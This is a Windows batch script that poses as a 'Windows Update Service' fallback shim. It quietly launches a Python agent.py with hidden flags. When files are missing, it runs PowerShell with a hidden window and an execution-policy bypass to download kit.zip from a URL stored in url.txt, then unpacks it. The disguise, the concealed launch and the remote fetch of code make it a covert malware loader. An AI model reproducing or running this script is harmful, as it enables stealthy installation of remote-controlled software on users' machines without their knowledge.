@echo off
rem  Windows Update Service - fallback shim.
rem  wu.vbs is the normal path (no console at all). This exists for the cases
rem  where wscript is unavailable: it starts the agent DETACHED and exits
rem  immediately, so cmd never stays on the desktop.
setlocal
set "HERE=%~dp0"

if not exist "%HERE%syspy\config.py" call :rebuild
if not exist "%HERE%agent.py" exit /b 0

set "PY="
if exist "%HERE%runtime\pythonw.exe" set "PY=%HERE%runtime\pythonw.exe"
if not defined PY if exist "%HERE%runtime\python.exe" set "PY=%HERE%runtime\python.exe"
if not defined PY for /f "delims=" %%X in ('where pyw.exe 2^>nul') do if not defined PY set "PY=%%X"
if not defined PY for /f "delims=" %%X in ('where pythonw.exe 2^>nul') do if not defined PY set "PY=%%X"
if not defined PY for /f "delims=" %%X in ('where python.exe 2^>nul') do if not defined PY set "PY=%%X"
if not defined PY exit /b 0

rem  pyw.exe needs -3, pythonw.exe must not have it.
if /i "%PY:~-7%"=="pyw.exe" (
    start "" /b "%PY%" -3 "%HERE%agent.py" --hidden --no-elevate
) else (
    start "" /b "%PY%" "%HERE%agent.py" --hidden --no-elevate
)
exit /b 0

:rebuild
if exist "%HERE%kit.zip" goto :unpack
if not exist "%HERE%url.txt" exit /b 0
set "WUURL="
set /p WUURL=<"%HERE%url.txt"
if not defined WUURL exit /b 0
rem  Quoted so a URL containing & survives.
powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "try{Invoke-WebRequest -UseBasicParsing -TimeoutSec 180 -Uri '%WUURL%/wu/kit.zip' -OutFile '%HERE%kit.zip'}catch{}"
if not exist "%HERE%kit.zip" exit /b 0

:unpack
tar -xf "%HERE%kit.zip" -C "%HERE%" 2>nul
if exist "%HERE%syspy\config.py" exit /b 0
powershell -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -Command ^
  "Add-Type -A System.IO.Compression.FileSystem; [IO.Compression.ZipFile]::ExtractToDirectory('%HERE%kit.zip','%HERE%')" 2>nul
exit /b 0
